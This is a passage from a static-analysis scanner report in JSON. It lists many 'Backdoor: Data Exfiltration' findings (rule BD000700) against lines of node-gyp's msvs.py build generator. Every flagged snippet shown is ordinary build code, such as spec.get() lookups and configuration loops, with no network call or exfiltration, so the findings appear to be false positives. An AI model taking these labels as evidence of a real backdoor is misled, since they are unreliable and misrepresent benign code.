                      "markdown": "`            configuration = \"$(Configuration)\"\n            if params.get(\"target_arch\") == \"x64\":\n                configuration += \"_x64\"\n            if params.get(\"target_arch\") == \"arm64\":\n                configuration += \"_arm64\"\n            spec[\"msvs_external_builder_out_dir\"] = os.path.join(\n                gyp.common.RelativePath(params[\"options\"].toplevel_dir, gyp_dir),\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1983,
                  "startColumn": 21,
                  "endLine": 1983,
                  "endColumn": 26,
                  "snippet": {
                    "text": "            gyp_file, _, _ = gyp.common.ParseQualifiedTarget(qualified_target)\n            gyp_dir = os.path.dirname(gyp_file)\n            configuration = \"$(Configuration)\"\n            if params.get(\"target_arch\") == \"x64\":\n                configuration += \"_x64\"\n            if params.get(\"target_arch\") == \"arm64\":\n                configuration += \"_arm64\"\n",
                    "rendered": {
                      "text": "            gyp_file, _, _ = gyp.common.ParseQualifiedTarget(qualified_target)\n            gyp_dir = os.path.dirname(gyp_file)\n            configuration = \"$(Configuration)\"\n            if params.get(\"target_arch\") == \"x64\":\n                configuration += \"_x64\"\n            if params.get(\"target_arch\") == \"arm64\":\n                configuration += \"_arm64\"\n",
                      "markdown": "`            gyp_file, _, _ = gyp.common.ParseQualifiedTarget(qualified_target)\n            gyp_dir = os.path.dirname(gyp_file)\n            configuration = \"$(Configuration)\"\n            if params.get(\"target_arch\") == \"x64\":\n                configuration += \"_x64\"\n            if params.get(\"target_arch\") == \"arm64\":\n                configuration += \"_arm64\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1979,
                  "startColumn": 19,
                  "endLine": 1979,
                  "endColumn": 24,
                  "snippet": {
                    "text": "        path_to_ninja = spec.get(\"msvs_path_to_ninja\", \"ninja.exe\")\n\n        spec[\"msvs_external_builder\"] = \"ninja\"\n        if not spec.get(\"msvs_external_builder_out_dir\"):\n            gyp_file, _, _ = gyp.common.ParseQualifiedTarget(qualified_target)\n            gyp_dir = os.path.dirname(gyp_file)\n            configuration = \"$(Configuration)\"\n",
                    "rendered": {
                      "text": "        path_to_ninja = spec.get(\"msvs_path_to_ninja\", \"ninja.exe\")\n\n        spec[\"msvs_external_builder\"] = \"ninja\"\n        if not spec.get(\"msvs_external_builder_out_dir\"):\n            gyp_file, _, _ = gyp.common.ParseQualifiedTarget(qualified_target)\n            gyp_dir = os.path.dirname(gyp_file)\n            configuration = \"$(Configuration)\"\n",
                      "markdown": "`        path_to_ninja = spec.get(\"msvs_path_to_ninja\", \"ninja.exe\")\n\n        spec[\"msvs_external_builder\"] = \"ninja\"\n        if not spec.get(\"msvs_external_builder_out_dir\"):\n            gyp_file, _, _ = gyp.common.ParseQualifiedTarget(qualified_target)\n            gyp_dir = os.path.dirname(gyp_file)\n            configuration = \"$(Configuration)\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1976,
                  "startColumn": 28,
                  "endLine": 1976,
                  "endColumn": 33,
                  "snippet": {
                    "text": "            # The spec explicitly defined an external builder, so don't change it.\n            continue\n\n        path_to_ninja = spec.get(\"msvs_path_to_ninja\", \"ninja.exe\")\n\n        spec[\"msvs_external_builder\"] = \"ninja\"\n        if not spec.get(\"msvs_external_builder_out_dir\"):\n",
                    "rendered": {
                      "text": "            # The spec explicitly defined an external builder, so don't change it.\n            continue\n\n        path_to_ninja = spec.get(\"msvs_path_to_ninja\", \"ninja.exe\")\n\n        spec[\"msvs_external_builder\"] = \"ninja\"\n        if not spec.get(\"msvs_external_builder_out_dir\"):\n",
                      "markdown": "`            # The spec explicitly defined an external builder, so don't change it.\n            continue\n\n        path_to_ninja = spec.get(\"msvs_path_to_ninja\", \"ninja.exe\")\n\n        spec[\"msvs_external_builder\"] = \"ninja\"\n        if not spec.get(\"msvs_external_builder_out_dir\"):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1972,
                  "startColumn": 15,
                  "endLine": 1972,
                  "endColumn": 20,
                  "snippet": {
                    "text": "  \"\"\"\n    for qualified_target in target_list:\n        spec = target_dicts[qualified_target]\n        if spec.get(\"msvs_external_builder\"):\n            # The spec explicitly defined an external builder, so don't change it.\n            continue\n\n",
                    "rendered": {
                      "text": "  \"\"\"\n    for qualified_target in target_list:\n        spec = target_dicts[qualified_target]\n        if spec.get(\"msvs_external_builder\"):\n            # The spec explicitly defined an external builder, so don't change it.\n            continue\n\n",
                      "markdown": "`  \"\"\"\n    for qualified_target in target_list:\n        spec = target_dicts[qualified_target]\n        if spec.get(\"msvs_external_builder\"):\n            # The spec explicitly defined an external builder, so don't change it.\n            continue\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1952,
                  "startColumn": 31,
                  "endLine": 1952,
                  "endColumn": 36,
                  "snippet": {
                    "text": "    # ninja\n    for project in projects.values():\n        if not project.spec.get(\"msvs_external_builder\"):\n            deps = project.spec.get(\"dependencies\", [])\n            deps = [projects[d] for d in deps]\n            project.set_dependencies(deps)\n    return projects\n",
                    "rendered": {
                      "text": "    # ninja\n    for project in projects.values():\n        if not project.spec.get(\"msvs_external_builder\"):\n            deps = project.spec.get(\"dependencies\", [])\n            deps = [projects[d] for d in deps]\n            project.set_dependencies(deps)\n    return projects\n",
                      "markdown": "`    # ninja\n    for project in projects.values():\n        if not project.spec.get(\"msvs_external_builder\"):\n            deps = project.spec.get(\"dependencies\", [])\n            deps = [projects[d] for d in deps]\n            project.set_dependencies(deps)\n    return projects\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1951,
                  "startColumn": 27,
                  "endLine": 1951,
                  "endColumn": 32,
                  "snippet": {
                    "text": "    # Set all the dependencies, but not if we are using an external builder like\n    # ninja\n    for project in projects.values():\n        if not project.spec.get(\"msvs_external_builder\"):\n            deps = project.spec.get(\"dependencies\", [])\n            deps = [projects[d] for d in deps]\n            project.set_dependencies(deps)\n",
                    "rendered": {
                      "text": "    # Set all the dependencies, but not if we are using an external builder like\n    # ninja\n    for project in projects.values():\n        if not project.spec.get(\"msvs_external_builder\"):\n            deps = project.spec.get(\"dependencies\", [])\n            deps = [projects[d] for d in deps]\n            project.set_dependencies(deps)\n",
                      "markdown": "`    # Set all the dependencies, but not if we are using an external builder like\n    # ninja\n    for project in projects.values():\n        if not project.spec.get(\"msvs_external_builder\"):\n            deps = project.spec.get(\"dependencies\", [])\n            deps = [projects[d] for d in deps]\n            project.set_dependencies(deps)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1898,
                  "startColumn": 20,
                  "endLine": 1898,
                  "endColumn": 25,
                  "snippet": {
                    "text": "    config_platform_overrides = {}\n    for config_name, c in spec[\"configurations\"].items():\n        config_fullname = _ConfigFullName(config_name, c)\n        platform = c.get(\"msvs_target_platform\", _ConfigPlatform(c))\n        base_name = _ConfigBaseName(config_name, _ConfigPlatform(c))\n        fixed_config_fullname = f\"{base_name}|{platform}\"\n        if spec[\"toolset\"] == \"host\" and generator_supports_multiple_toolsets:\n",
                    "rendered": {
                      "text": "    config_platform_overrides = {}\n    for config_name, c in spec[\"configurations\"].items():\n        config_fullname = _ConfigFullName(config_name, c)\n        platform = c.get(\"msvs_target_platform\", _ConfigPlatform(c))\n        base_name = _ConfigBaseName(config_name, _ConfigPlatform(c))\n        fixed_config_fullname = f\"{base_name}|{platform}\"\n        if spec[\"toolset\"] == \"host\" and generator_supports_multiple_toolsets:\n",
                      "markdown": "`    config_platform_overrides = {}\n    for config_name, c in spec[\"configurations\"].items():\n        config_fullname = _ConfigFullName(config_name, c)\n        platform = c.get(\"msvs_target_platform\", _ConfigPlatform(c))\n        base_name = _ConfigBaseName(config_name, _ConfigPlatform(c))\n        fixed_config_fullname = f\"{base_name}|{platform}\"\n        if spec[\"toolset\"] == \"host\" and generator_supports_multiple_toolsets:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1873,
                  "startColumn": 34,
                  "endLine": 1873,
                  "endColumn": 39,
                  "snippet": {
                    "text": "\ndef _GetPathOfProject(qualified_target, spec, options, msvs_version):\n    default_config = _GetDefaultConfiguration(spec)\n    proj_filename = default_config.get(\"msvs_existing_vcproj\")\n    if not proj_filename:\n        proj_filename = spec[\"target_name\"]\n        if spec[\"toolset\"] == \"host\":\n",
                    "rendered": {
                      "text": "\ndef _GetPathOfProject(qualified_target, spec, options, msvs_version):\n    default_config = _GetDefaultConfiguration(spec)\n    proj_filename = default_config.get(\"msvs_existing_vcproj\")\n    if not proj_filename:\n        proj_filename = spec[\"target_name\"]\n        if spec[\"toolset\"] == \"host\":\n",
                      "markdown": "`\ndef _GetPathOfProject(qualified_target, spec, options, msvs_version):\n    default_config = _GetDefaultConfiguration(spec)\n    proj_filename = default_config.get(\"msvs_existing_vcproj\")\n    if not proj_filename:\n        proj_filename = spec[\"target_name\"]\n        if spec[\"toolset\"] == \"host\":\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1771,
                  "startColumn": 22,
                  "endLine": 1771,
                  "endColumn": 27,
                  "snippet": {
                    "text": "    copies = []\n    # Add copies.\n    for cpy in spec.get(\"copies\", []):\n        for src in cpy.get(\"files\", []):\n            dst = os.path.join(cpy[\"destination\"], os.path.basename(src))\n            # _AddCustomBuildToolForMSVS() will call _FixPath() on the inputs and\n            # outputs, so do the same for our generated command line.\n",
                    "rendered": {
                      "text": "    copies = []\n    # Add copies.\n    for cpy in spec.get(\"copies\", []):\n        for src in cpy.get(\"files\", []):\n            dst = os.path.join(cpy[\"destination\"], os.path.basename(src))\n            # _AddCustomBuildToolForMSVS() will call _FixPath() on the inputs and\n            # outputs, so do the same for our generated command line.\n",
                      "markdown": "`    copies = []\n    # Add copies.\n    for cpy in spec.get(\"copies\", []):\n        for src in cpy.get(\"files\", []):\n            dst = os.path.join(cpy[\"destination\"], os.path.basename(src))\n            # _AddCustomBuildToolForMSVS() will call _FixPath() on the inputs and\n            # outputs, so do the same for our generated command line.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1770,
                  "startColumn": 19,
                  "endLine": 1770,
                  "endColumn": 24,
                  "snippet": {
                    "text": "def _GetCopies(spec):\n    copies = []\n    # Add copies.\n    for cpy in spec.get(\"copies\", []):\n        for src in cpy.get(\"files\", []):\n            dst = os.path.join(cpy[\"destination\"], os.path.basename(src))\n            # _AddCustomBuildToolForMSVS() will call _FixPath() on the inputs and\n",
                    "rendered": {
                      "text": "def _GetCopies(spec):\n    copies = []\n    # Add copies.\n    for cpy in spec.get(\"copies\", []):\n        for src in cpy.get(\"files\", []):\n            dst = os.path.join(cpy[\"destination\"], os.path.basename(src))\n            # _AddCustomBuildToolForMSVS() will call _FixPath() on the inputs and\n",
                      "markdown": "`def _GetCopies(spec):\n    copies = []\n    # Add copies.\n    for cpy in spec.get(\"copies\", []):\n        for src in cpy.get(\"files\", []):\n            dst = os.path.join(cpy[\"destination\"], os.path.basename(src))\n            # _AddCustomBuildToolForMSVS() will call _FixPath() on the inputs and\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1740,
                  "startColumn": 17,
                  "endLine": 1740,
                  "endColumn": 22,
                  "snippet": {
                    "text": "        action = run_as.get(\"action\", [])\n        environment = run_as.get(\"environment\", [])\n        working_directory = run_as.get(\"working_directory\", \".\")\n    elif int(spec.get(\"test\", 0)):\n        action = [\"$(TargetPath)\", \"--gtest_print_time\"]\n        environment = []\n        working_directory = \".\"\n",
                    "rendered": {
                      "text": "        action = run_as.get(\"action\", [])\n        environment = run_as.get(\"environment\", [])\n        working_directory = run_as.get(\"working_directory\", \".\")\n    elif int(spec.get(\"test\", 0)):\n        action = [\"$(TargetPath)\", \"--gtest_print_time\"]\n        environment = []\n        working_directory = \".\"\n",
                      "markdown": "`        action = run_as.get(\"action\", [])\n        environment = run_as.get(\"environment\", [])\n        working_directory = run_as.get(\"working_directory\", \".\")\n    elif int(spec.get(\"test\", 0)):\n        action = [\"$(TargetPath)\", \"--gtest_print_time\"]\n        environment = []\n        working_directory = \".\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1739,
                  "startColumn": 34,
                  "endLine": 1739,
                  "endColumn": 39,
                  "snippet": {
                    "text": "        run_as = spec[\"run_as\"]\n        action = run_as.get(\"action\", [])\n        environment = run_as.get(\"environment\", [])\n        working_directory = run_as.get(\"working_directory\", \".\")\n    elif int(spec.get(\"test\", 0)):\n        action = [\"$(TargetPath)\", \"--gtest_print_time\"]\n        environment = []\n",
                    "rendered": {
                      "text": "        run_as = spec[\"run_as\"]\n        action = run_as.get(\"action\", [])\n        environment = run_as.get(\"environment\", [])\n        working_directory = run_as.get(\"working_directory\", \".\")\n    elif int(spec.get(\"test\", 0)):\n        action = [\"$(TargetPath)\", \"--gtest_print_time\"]\n        environment = []\n",
                      "markdown": "`        run_as = spec[\"run_as\"]\n        action = run_as.get(\"action\", [])\n        environment = run_as.get(\"environment\", [])\n        working_directory = run_as.get(\"working_directory\", \".\")\n    elif int(spec.get(\"test\", 0)):\n        action = [\"$(TargetPath)\", \"--gtest_print_time\"]\n        environment = []\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1738,
                  "startColumn": 28,
                  "endLine": 1738,
                  "endColumn": 33,
                  "snippet": {
                    "text": "    if \"run_as\" in spec:\n        run_as = spec[\"run_as\"]\n        action = run_as.get(\"action\", [])\n        environment = run_as.get(\"environment\", [])\n        working_directory = run_as.get(\"working_directory\", \".\")\n    elif int(spec.get(\"test\", 0)):\n        action = [\"$(TargetPath)\", \"--gtest_print_time\"]\n",
                    "rendered": {
                      "text": "    if \"run_as\" in spec:\n        run_as = spec[\"run_as\"]\n        action = run_as.get(\"action\", [])\n        environment = run_as.get(\"environment\", [])\n        working_directory = run_as.get(\"working_directory\", \".\")\n    elif int(spec.get(\"test\", 0)):\n        action = [\"$(TargetPath)\", \"--gtest_print_time\"]\n",
                      "markdown": "`    if \"run_as\" in spec:\n        run_as = spec[\"run_as\"]\n        action = run_as.get(\"action\", [])\n        environment = run_as.get(\"environment\", [])\n        working_directory = run_as.get(\"working_directory\", \".\")\n    elif int(spec.get(\"test\", 0)):\n        action = [\"$(TargetPath)\", \"--gtest_print_time\"]\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1737,
                  "startColumn": 23,
                  "endLine": 1737,
                  "endColumn": 28,
                  "snippet": {
                    "text": "    # Add run_as and test targets.\n    if \"run_as\" in spec:\n        run_as = spec[\"run_as\"]\n        action = run_as.get(\"action\", [])\n        environment = run_as.get(\"environment\", [])\n        working_directory = run_as.get(\"working_directory\", \".\")\n    elif int(spec.get(\"test\", 0)):\n",
                    "rendered": {
                      "text": "    # Add run_as and test targets.\n    if \"run_as\" in spec:\n        run_as = spec[\"run_as\"]\n        action = run_as.get(\"action\", [])\n        environment = run_as.get(\"environment\", [])\n        working_directory = run_as.get(\"working_directory\", \".\")\n    elif int(spec.get(\"test\", 0)):\n",
                      "markdown": "`    # Add run_as and test targets.\n    if \"run_as\" in spec:\n        run_as = spec[\"run_as\"]\n        action = run_as.get(\"action\", [])\n        environment = run_as.get(\"environment\", [])\n        working_directory = run_as.get(\"working_directory\", \".\")\n    elif int(spec.get(\"test\", 0)):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1728,
                  "startColumn": 25,
                  "endLine": 1728,
                  "endColumn": 30,
                  "snippet": {
                    "text": "            actions_to_add,\n            inputs=inputs,\n            outputs=a.get(\"outputs\", []),\n            description=a.get(\"message\", a[\"action_name\"]),\n            command=cmd,\n        )\n\n",
                    "rendered": {
                      "text": "            actions_to_add,\n            inputs=inputs,\n            outputs=a.get(\"outputs\", []),\n            description=a.get(\"message\", a[\"action_name\"]),\n            command=cmd,\n        )\n\n",
                      "markdown": "`            actions_to_add,\n            inputs=inputs,\n            outputs=a.get(\"outputs\", []),\n            description=a.get(\"message\", a[\"action_name\"]),\n            command=cmd,\n        )\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1727,
                  "startColumn": 21,
                  "endLine": 1727,
                  "endColumn": 26,
                  "snippet": {
                    "text": "        _AddActionStep(\n            actions_to_add,\n            inputs=inputs,\n            outputs=a.get(\"outputs\", []),\n            description=a.get(\"message\", a[\"action_name\"]),\n            command=cmd,\n        )\n",
                    "rendered": {
                      "text": "        _AddActionStep(\n            actions_to_add,\n            inputs=inputs,\n            outputs=a.get(\"outputs\", []),\n            description=a.get(\"message\", a[\"action_name\"]),\n            command=cmd,\n        )\n",
                      "markdown": "`        _AddActionStep(\n            actions_to_add,\n            inputs=inputs,\n            outputs=a.get(\"outputs\", []),\n            description=a.get(\"message\", a[\"action_name\"]),\n            command=cmd,\n        )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1716,
                  "startColumn": 18,
                  "endLine": 1716,
                  "endColumn": 23,
                  "snippet": {
                    "text": "    have_setup_env = set()\n    for a in actions:\n        # Attach actions to the gyp file if nothing else is there.\n        inputs = a.get(\"inputs\") or [relative_path_of_gyp_file]\n        attached_to = inputs[0]\n        need_setup_env = attached_to not in have_setup_env\n        cmd = _BuildCommandLineForRule(\n",
                    "rendered": {
                      "text": "    have_setup_env = set()\n    for a in actions:\n        # Attach actions to the gyp file if nothing else is there.\n        inputs = a.get(\"inputs\") or [relative_path_of_gyp_file]\n        attached_to = inputs[0]\n        need_setup_env = attached_to not in have_setup_env\n        cmd = _BuildCommandLineForRule(\n",
                      "markdown": "`    have_setup_env = set()\n    for a in actions:\n        # Attach actions to the gyp file if nothing else is there.\n        inputs = a.get(\"inputs\") or [relative_path_of_gyp_file]\n        attached_to = inputs[0]\n        need_setup_env = attached_to not in have_setup_env\n        cmd = _BuildCommandLineForRule(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1708,
                  "startColumn": 18,
                  "endLine": 1708,
                  "endColumn": 23,
                  "snippet": {
                    "text": "\ndef _AddActions(actions_to_add, spec, relative_path_of_gyp_file):\n    # Add actions.\n    actions = spec.get(\"actions\", [])\n    # Don't setup_env every time. When all the actions are run together in one\n    # batch file in VS, the PATH will grow too long.\n    # Membership in this set means that the cygwin environment has been set up,\n",
                    "rendered": {
                      "text": "\ndef _AddActions(actions_to_add, spec, relative_path_of_gyp_file):\n    # Add actions.\n    actions = spec.get(\"actions\", [])\n    # Don't setup_env every time. When all the actions are run together in one\n    # batch file in VS, the PATH will grow too long.\n    # Membership in this set means that the cygwin environment has been set up,\n",
                      "markdown": "`\ndef _AddActions(actions_to_add, spec, relative_path_of_gyp_file):\n    # Add actions.\n    actions = spec.get(\"actions\", [])\n    # Don't setup_env every time. When all the actions are run together in one\n    # batch file in VS, the PATH will grow too long.\n    # Membership in this set means that the cygwin environment has been set up,\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1665,
                  "startColumn": 23,
                  "endLine": 1665,
                  "endColumn": 28,
                  "snippet": {
                    "text": "    # to have use of precompiled headers disabled.\n    extensions_excluded_from_precompile = []\n    for config_name, config in spec[\"configurations\"].items():\n        source = config.get(\"msvs_precompiled_source\")\n        if source:\n            source = _FixPath(source)\n            # UsePrecompiledHeader=1 for if using precompiled headers.\n",
                    "rendered": {
                      "text": "    # to have use of precompiled headers disabled.\n    extensions_excluded_from_precompile = []\n    for config_name, config in spec[\"configurations\"].items():\n        source = config.get(\"msvs_precompiled_source\")\n        if source:\n            source = _FixPath(source)\n            # UsePrecompiledHeader=1 for if using precompiled headers.\n",
                      "markdown": "`    # to have use of precompiled headers disabled.\n    extensions_excluded_from_precompile = []\n    for config_name, config in spec[\"configurations\"].items():\n        source = config.get(\"msvs_precompiled_source\")\n        if source:\n            source = _FixPath(source)\n            # UsePrecompiledHeader=1 for if using precompiled headers.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1652,
                  "startColumn": 23,
                  "endLine": 1652,
                  "endColumn": 28,
                  "snippet": {
                    "text": "    # Add in tool files (rules).\n    tool_files = OrderedSet()\n    for _, config in spec[\"configurations\"].items():\n        for f in config.get(\"msvs_tool_files\", []):\n            tool_files.add(f)\n    for f in tool_files:\n        p.AddToolFile(f)\n",
                    "rendered": {
                      "text": "    # Add in tool files (rules).\n    tool_files = OrderedSet()\n    for _, config in spec[\"configurations\"].items():\n        for f in config.get(\"msvs_tool_files\", []):\n            tool_files.add(f)\n    for f in tool_files:\n        p.AddToolFile(f)\n",
                      "markdown": "`    # Add in tool files (rules).\n    tool_files = OrderedSet()\n    for _, config in spec[\"configurations\"].items():\n        for f in config.get(\"msvs_tool_files\", []):\n            tool_files.add(f)\n    for f in tool_files:\n        p.AddToolFile(f)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
